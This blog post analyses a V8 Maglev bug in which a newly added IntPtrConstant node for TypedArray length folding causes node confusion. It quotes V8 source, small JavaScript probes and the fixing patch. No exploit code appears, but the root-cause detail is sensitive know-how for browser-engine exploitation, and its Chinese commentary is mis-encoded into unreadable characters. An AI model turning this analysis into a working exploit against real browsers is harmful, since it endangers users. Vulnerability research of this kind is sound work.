              <time title="Created: 2025-09-08 20:32:49 / Modified: 21:27:41" itemprop="dateCreated datePublished" datetime="2025-09-08T20:32:49+08:00">2025-09-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TL;DR : Newly Added IntPtrConstant Node in Maglev Leads to Maglev Node Confusion</p>
<p><a target="_blank" rel="noopener" href="https://issues.chromium.org/issues/410136467">https://issues.chromium.org/issues/410136467</a><br>Report æåˆ° <code>Commit da075df0ad2a3c0ff8a1db389704650f4c1cb648 added a new Constant node: IntPtrConstant, which is used for constant folding of TyperArray.length, indicating the length of TyperArray.</code></p>
<h2 id="Analyzing-IntPtr-commit"><a href="#Analyzing-IntPtr-commit" class="headerlink" title="Analyzing IntPtr commit"></a>Analyzing IntPtr commit</h2><p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8/+/da075df0ad2a3c0ff8a1db389704650f4c1cb648">https://chromium.googlesource.com/v8/v8/+/da075df0ad2a3c0ff8a1db389704650f4c1cb648</a></p>
<p>Float64Array æ˜¯ä¸€ç¨® TypedArray<br>TypedArray çš„å¤§å°è¦åœ¨å®£å‘Šæ™‚æŒ‡å®šï¼Œä¹‹å¾Œä¸èƒ½æ”¹<br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Float64Array">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Float64Array</a></p>
<p>é€™äº› turbolev-graph-builder.cc ä¸­çš„ Process éƒ½æ˜¯ç”¨åœ¨æŠŠ Maglev IR è½‰æˆ turboshaft IR çš„åœ°æ–¹</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">RunMaglevOptimizations</span>(data, compilation_info.<span class="built_in">get</span>(), maglev_graph);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// TODO(nicohartmann): Should we have source positions here?</span></span><br><span class="line">  data-&gt;<span class="built_in">InitializeGraphComponent</span>(<span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">  std::optional&lt;BailoutReason&gt; bailout;</span><br><span class="line">  <span class="function">maglev::GraphProcessor&lt;NodeProcessorBase&gt; <span class="title">builder</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">      data, data-&gt;graph(), temp_zone,</span></span></span><br><span class="line"><span class="params"><span class="function">      compilation_info-&gt;toplevel_compilation_unit(), &amp;bailout)</span></span>;</span><br><span class="line">  builder.<span class="built_in">ProcessGraph</span>(maglev_graph);</span><br></pre></td></tr></table></figure>

<p>çœ‹å¹¾å€‹ä¾‹å­<br>V&lt;node&gt; æ˜¯ Turboshaft IR</p>
<h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/compiler/turboshaft/turbolev-graph-builder.cc</span></span><br><span class="line"><span class="function">maglev::ProcessResult <span class="title">Process</span><span class="params">(maglev::IntPtrConstant* node,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="type">const</span> maglev::ProcessingState&amp; state)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// cast node-&gt;value as word-size ptr then create mapping(?                             </span></span><br><span class="line">    <span class="built_in">SetMap</span>(node, __ <span class="built_in">WordPtrConstant</span>(node-&gt;<span class="built_in">value</span>()));</span><br><span class="line">    <span class="keyword">return</span> maglev::ProcessResult::kContinue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetMap</span><span class="params">(maglev::NodeBase* node, V&lt;Any&gt; idx)</span> </span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">    node_mapping_[node] = idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">V&lt;WordPtr&gt; <span class="title">WordPtrConstant</span><span class="params">(<span class="type">uintptr_t</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> V&lt;WordPtr&gt;::<span class="built_in">Cast</span>(<span class="built_in">WordConstant</span>(value, WordRepresentation::<span class="built_in">WordPtr</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Example2"><a href="#Example2" class="headerlink" title="Example2"></a>Example2</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/compiler/turboshaft/turbolev-graph-builder.cc</span></span><br><span class="line"><span class="function">maglev::ProcessResult <span class="title">Process</span><span class="params">(maglev::LoadUnsignedIntTypedArrayElement* node,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="type">const</span> maglev::ProcessingState&amp; state)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node-&gt;<span class="built_in">has_off_heap_constant_typed_array</span>()) &#123;</span><br><span class="line">      <span class="built_in">SetMap</span>(node, <span class="built_in">BuildConstantTypedArrayLoad</span>(node-&gt;<span class="built_in">constant_typed_array</span>(),</span><br><span class="line">                                               <span class="built_in">Map</span>&lt;Word32&gt;(node-&gt;<span class="built_in">index_input</span>()),</span><br><span class="line">                                               node-&gt;<span class="built_in">elements_kind</span>()));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">SetMap</span>(node, <span class="built_in">BuildTypedArrayLoad</span>(<span class="built_in">Map</span>&lt;JSTypedArray&gt;(node-&gt;<span class="built_in">object_input</span>()),</span><br><span class="line">                                       <span class="built_in">Map</span>&lt;Word32&gt;(node-&gt;<span class="built_in">index_input</span>()),</span><br><span class="line">                                       node-&gt;<span class="built_in">elements_kind</span>()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maglev::ProcessResult::kContinue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">V&lt;Untagged&gt; <span class="title">BuildTypedArrayLoad</span><span class="params">(V&lt;JSTypedArray&gt; typed_array, V&lt;Word32&gt; index,</span></span></span><br><span class="line"><span class="params"><span class="function">                                  ElementsKind kind)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Use LoadField to load attribute from typed_array</span></span><br><span class="line">    <span class="keyword">auto</span> [data_pointer, base_pointer] =</span><br><span class="line">        <span class="built_in">GetTypedArrayDataAndBasePointers</span>(typed_array);</span><br><span class="line">    <span class="keyword">return</span> __ <span class="built_in">LoadTypedElement</span>(typed_array, base_pointer, data_pointer,</span><br><span class="line">                               __ <span class="built_in">ChangeUint32ToUintPtr</span>(index),</span><br><span class="line">                               <span class="built_in">GetArrayTypeFromElementsKind</span>(kind));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Optimizing-Property-Load-of-TypedArray-Length"><a href="#Optimizing-Property-Load-of-TypedArray-Length" class="headerlink" title="Optimizing Property Load of TypedArray::Length"></a>Optimizing Property Load of TypedArray::Length</h2><p>æ¢ä»¶ç¬¦åˆæ™‚ç›´æ¥å»ºç«‹ä¸€å€‹ IntPtrConstant Node<br>åŸå…ˆéœ€è¦å…ˆè¨ˆç®— length çš„ offsetï¼Œå†å¾ object ä¸Šå–å€¼<br>ç¾åœ¨å¯ä»¥ç›´æ¥ç”¨é€™å€‹ Node å–å€¼ä¾†åŠ é€Ÿ</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ReduceResult <span class="title">MaglevGraphBuilder::BuildLoadTypedArrayLength</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ValueNode* object, ElementsKind elements_kind)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK</span>(<span class="built_in">IsTypedArrayOrRabGsabTypedArrayElementsKind</span>(elements_kind));</span><br><span class="line">  <span class="type">bool</span> is_variable_length = <span class="built_in">IsRabGsabTypedArrayElementsKind</span>(elements_kind);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_variable_length) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> const_object = object-&gt;<span class="built_in">TryGetConstant</span>(<span class="built_in">broker</span>())) &#123;</span><br><span class="line">      <span class="comment">// TODO(marja): Add TryGetConstant&lt;JSTypedArray&gt;().</span></span><br><span class="line">      <span class="keyword">if</span> (const_object-&gt;<span class="built_in">IsJSTypedArray</span>()) &#123;</span><br><span class="line">        <span class="keyword">auto</span> const_typed_array = const_object-&gt;<span class="built_in">AsJSTypedArray</span>();</span><br><span class="line">        <span class="keyword">if</span> (!const_typed_array.<span class="built_in">is_on_heap</span>() &amp;&amp;</span><br><span class="line">            !<span class="built_in">IsRabGsabTypedArrayElementsKind</span>(</span><br><span class="line">                const_typed_array.<span class="built_in">elements_kind</span>(<span class="built_in">broker</span>()))) &#123;</span><br><span class="line">          <span class="type">size_t</span> length = const_typed_array.<span class="built_in">length</span>(<span class="built_in">broker</span>());</span><br><span class="line">          <span class="built_in">static_assert</span>(ArrayBuffer::kMaxByteLength &lt;=</span><br><span class="line">                        std::numeric_limits&lt;<span class="type">intptr_t</span>&gt;::<span class="built_in">max</span>());</span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">GetIntPtrConstant</span>(<span class="built_in">static_cast</span>&lt;<span class="type">intptr_t</span>&gt;(length));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Note: We can&#x27;t use broker()-&gt;length_string() here, because it could</span></span><br><span class="line">    <span class="comment">// conflict with redefinitions of the TypedArray length property.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ValueNode* length = <span class="built_in">known_node_aspects</span>().<span class="built_in">TryFindLoadedConstantProperty</span>(</span><br><span class="line">            object,</span><br><span class="line">            KnownNodeAspects::LoadedPropertyMapKey::<span class="built_in">TypedArrayLength</span>())) &#123;</span><br><span class="line">      <span class="keyword">return</span> length;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ValueNode* result = <span class="built_in">AddNewNode</span>&lt;LoadTypedArrayLength&gt;(&#123;object&#125;, elements_kind);</span><br><span class="line">  <span class="keyword">if</span> (!is_variable_length) &#123;</span><br><span class="line">    <span class="built_in">RecordKnownProperty</span>(</span><br><span class="line">        object, KnownNodeAspects::LoadedPropertyMapKey::<span class="built_in">TypedArrayLength</span>(),</span><br><span class="line">        result, <span class="literal">true</span>, compiler::AccessMode::kLoad);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹å®Œæª¢æŸ¥çš„é‚è¼¯å¾Œæˆ‘æƒ³ç¢ºèª maglev ä¸­çš„ constant <code>if (auto const_object = object-&gt;TryGetConstant(broker()))</code> æ˜¯ä»€éº¼ï¼Œæ‰€ä»¥åšäº†åº•ä¸‹çš„å°å¯¦é©—<br>é€™å€‹æœƒé€šéæª¢æŸ¥é€²åˆ° GetIntPtrConstant ï¼Œå˜—è©¦ reuse æˆ–å»ºç«‹ IntPtrConstant Node</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ta = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> len = ta.<span class="property">length</span>;</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    sum += ta[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sum / len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">PrepareFunctionForOptimization</span>(foo);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10_000</span>; ++i) <span class="title function_">foo</span>();</span><br><span class="line">%<span class="title class_">OptimizeMaglevOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>();</span><br></pre></td></tr></table></figure>
<p>ä½†åº•ä¸‹é€™å€‹ä¸æœƒï¼Œæ¨æ¸¬æ˜¯ Maglev ç„¡æ³•åˆ¤æ–· arr æœƒä¸æœƒè®Šå‹•æ‰€ä»¥æ²’æŠŠä»–ç•¶ constant(å› ç‚ºä»–æ˜¯ parameter)</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">processTypedArray</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> len = arr.<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    sum += arr[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sum / arr.<span class="property">length</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> array = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">  <span class="title function_">processTypedArray</span>(array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Patch-Analysis"><a href="#Patch-Analysis" class="headerlink" title="Patch Analysis"></a>Patch Analysis</h2><p><a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/6455743">https://chromium-review.googlesource.com/c/v8/v8/+/6455743</a></p>
<p>åœ¨ <code>MaglevAssembler::MaterialiseValueNode</code> å¢åŠ äº†å° IntPtrConstant çš„ case æª¢æŸ¥<br>çœ‹åˆ°é€™é‚Šçš„çŒœæ¸¬æ˜¯è¸©åˆ° <code>DCHECK(!value-&gt;allocation().IsConstant())</code> å°è‡´ crashï¼Œä½†åœ¨ release ç‰ˆæ²’æœ‰ DCHECK æ‰€ä»¥å¯ä»¥èµ°åˆ°å¾Œé¢å°è‡´ Node Confusion</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/maglev/maglev-assembler.cc</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MaglevAssembler::MaterialiseValueNode</span><span class="params">(Register dst, ValueNode* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (value-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">    <span class="keyword">case</span> Opcode::kInt32Constant: &#123;</span><br><span class="line">      <span class="type">int32_t</span> int_value = value-&gt;<span class="built_in">Cast</span>&lt;Int32Constant&gt;()-&gt;<span class="built_in">value</span>();</span><br><span class="line">      <span class="keyword">if</span> (Smi::<span class="built_in">IsValid</span>(int_value)) &#123;</span><br><span class="line">        <span class="built_in">Move</span>(dst, Smi::<span class="built_in">FromInt</span>(int_value));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">MoveHeapNumber</span>(dst, int_value);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> Opcode::kIntPtrConstant: &#123;</span><br><span class="line">      <span class="type">intptr_t</span> intptr_value = value-&gt;<span class="built_in">Cast</span>&lt;IntPtrConstant&gt;()-&gt;<span class="built_in">value</span>();</span><br><span class="line">      <span class="keyword">if</span> (intptr_value &lt;= std::numeric_limits&lt;<span class="type">int</span>&gt;::<span class="built_in">max</span>() &amp;&amp;</span><br><span class="line">          Smi::<span class="built_in">IsValid</span>(<span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(intptr_value))) &#123;</span><br><span class="line">        <span class="built_in">Move</span>(dst, Smi::<span class="built_in">FromInt</span>(<span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(intptr_value)));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">MoveHeapNumber</span>(dst, intptr_value);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> Opcode::kUint32Constant: &#123;</span><br><span class="line">      <span class="type">uint32_t</span> uint_value = value-&gt;<span class="built_in">Cast</span>&lt;Uint32Constant&gt;()-&gt;<span class="built_in">value</span>();</span><br><span class="line">      <span class="keyword">if</span> (Smi::<span class="built_in">IsValid</span>(uint_value)) &#123;</span><br><span class="line">        <span class="built_in">Move</span>(dst, Smi::<span class="built_in">FromInt</span>(uint_value));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">MoveHeapNumber</span>(dst, uint_value);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> Opcode::kFloat64Constant: &#123;</span><br><span class="line">      <span class="type">double</span> double_value =</span><br><span class="line">          value-&gt;<span class="built_in">Cast</span>&lt;Float64Constant&gt;()-&gt;<span class="built_in">value</span>().<span class="built_in">get_scalar</span>();</span><br><span class="line">      <span class="type">int</span> smi_value;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">DoubleToSmiInteger</span>(double_value, &amp;smi_value)) &#123;</span><br><span class="line">        <span class="built_in">Move</span>(dst, Smi::<span class="built_in">FromInt</span>(smi_value));</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">MoveHeapNumber</span>(dst, double_value);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">DCHECK</span>(!value-&gt;<span class="built_in">allocation</span>().<span class="built_in">IsConstant</span>());</span><br><span class="line">  <span class="built_in">DCHECK</span>(value-&gt;<span class="built_in">allocation</span>().<span class="built_in">IsAnyStackSlot</span>());</span><br><span class="line">  <span class="keyword">using</span> D = NewHeapNumberDescriptor;</span><br><span class="line">  DoubleRegister builtin_input_value = D::<span class="built_in">GetDoubleRegisterParameter</span>(D::kValue);</span><br><span class="line">  MemOperand src = <span class="built_in">ToMemOperand</span>(value-&gt;<span class="built_in">allocation</span>());</span><br><span class="line">  <span class="keyword">switch</span> (value-&gt;<span class="built_in">properties</span>().<span class="built_in">value_representation</span>()) &#123;</span><br><span class="line">    <span class="keyword">case</span> ValueRepresentation::kInt32: &#123;</span><br><span class="line">      Label done;</span><br><span class="line">      <span class="function">TemporaryRegisterScope <span class="title">temps</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">      Register scratch = temps.<span class="built_in">AcquireScratch</span>();</span><br><span class="line">      <span class="built_in">Move</span>(scratch, src);</span><br><span class="line">      <span class="built_in">SmiTagInt32AndJumpIfSuccess</span>(dst, scratch, &amp;done, Label::kNear);</span><br><span class="line">      <span class="comment">// If smi tagging fails, instead of bailing out (deopting), we change</span></span><br><span class="line">      <span class="comment">// representation to a HeapNumber.</span></span><br><span class="line">      <span class="built_in">Int32ToDouble</span>(builtin_input_value, scratch);</span><br><span class="line">      <span class="built_in">CallBuiltin</span>&lt;Builtin::kNewHeapNumber&gt;(builtin_input_value);</span><br><span class="line">      <span class="built_in">Move</span>(dst, kReturnRegister0);</span><br><span class="line">      <span class="built_in">bind</span>(&amp;done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> ValueRepresentation::kUint32: &#123;</span><br><span class="line">      Label done;</span><br><span class="line">      <span class="function">TemporaryRegisterScope <span class="title">temps</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">      Register scratch = temps.<span class="built_in">AcquireScratch</span>();</span><br><span class="line">      <span class="built_in">Move</span>(scratch, src);</span><br><span class="line">      <span class="built_in">SmiTagUint32AndJumpIfSuccess</span>(dst, scratch, &amp;done, Label::kNear);</span><br><span class="line">      <span class="comment">// If smi tagging fails, instead of bailing out (deopting), we change</span></span><br><span class="line">      <span class="comment">// representation to a HeapNumber.</span></span><br><span class="line">      <span class="built_in">Uint32ToDouble</span>(builtin_input_value, scratch);</span><br><span class="line">      <span class="built_in">CallBuiltin</span>&lt;Builtin::kNewHeapNumber&gt;(builtin_input_value);</span><br><span class="line">      <span class="built_in">Move</span>(dst, kReturnRegister0);</span><br><span class="line">      <span class="built_in">bind</span>(&amp;done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> ValueRepresentation::kFloat64:</span><br><span class="line">      <span class="built_in">LoadFloat64</span>(builtin_input_value, src);</span><br><span class="line">      <span class="built_in">CallBuiltin</span>&lt;Builtin::kNewHeapNumber&gt;(builtin_input_value);</span><br><span class="line">      <span class="built_in">Move</span>(dst, kReturnRegister0);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ValueRepresentation::kHoleyFloat64: &#123;</span><br><span class="line">      Label done, box;</span><br><span class="line">      <span class="built_in">JumpIfNotHoleNan</span>(src, &amp;box, Label::kNear);</span><br><span class="line">      <span class="built_in">LoadRoot</span>(dst, RootIndex::kUndefinedValue);</span><br><span class="line">      <span class="built_in">Jump</span>(&amp;done);</span><br><span class="line">      <span class="built_in">bind</span>(&amp;box);</span><br><span class="line">      <span class="built_in">LoadFloat64</span>(builtin_input_value, src);</span><br><span class="line">      <span class="built_in">CallBuiltin</span>&lt;Builtin::kNewHeapNumber&gt;(builtin_input_value);</span><br><span class="line">      <span class="built_in">Move</span>(dst, kReturnRegister0);</span><br><span class="line">      <span class="built_in">bind</span>(&amp;done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> ValueRepresentation::kIntPtr: &#123;</span><br><span class="line">      Label done;</span><br><span class="line">      <span class="function">TemporaryRegisterScope <span class="title">temps</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">      Register scratch = temps.<span class="built_in">AcquireScratch</span>();</span><br><span class="line">      <span class="built_in">Move</span>(scratch, src);</span><br><span class="line">      <span class="built_in">SmiTagIntPtrAndJumpIfSuccess</span>(dst, scratch, &amp;done, Label::kNear);</span><br><span class="line">      <span class="comment">// If smi tagging fails, instead of bailing out (deopting), we change</span></span><br><span class="line">      <span class="comment">// representation to a HeapNumber.</span></span><br><span class="line">      <span class="built_in">IntPtrToDouble</span>(builtin_input_value, scratch);</span><br><span class="line">      <span class="built_in">CallBuiltin</span>&lt;Builtin::kNewHeapNumber&gt;(builtin_input_value);</span><br><span class="line">      <span class="built_in">Move</span>(dst, kReturnRegister0);</span><br><span class="line">      <span class="built_in">bind</span>(&amp;done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> ValueRepresentation::kTagged:</span><br><span class="line">      <span class="built_in">UNREACHABLE</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>MaglevAssembler::MaterialiseValueNode åªæœ‰åœ¨ maglev-code-generator ä¸­çš„ ExceptionHandlerTrampolineBuilder Class ä¸­è¢«ä½¿ç”¨ï¼Œå°æ‡‰åˆ°çš„ Method æ˜¯ <code>EmitMaterialisationsAndPushResults</code> å’Œ <code>EmitPopMaterialisedResults</code>ã€‚<br>å¯ä»¥ç™¼ç¾å®ƒæœƒæª¢æŸ¥ <code>if (IsConstantNode(move.source-&gt;opcode()))</code> ä¾†æ±ºå®šè¦ä¸è¦å‘¼å« <code>MaterialiseValueNode()</code>ï¼Œæ‰€ä»¥åªè¦çœ‹ <code>EmitPopMaterialisedResults</code></p>
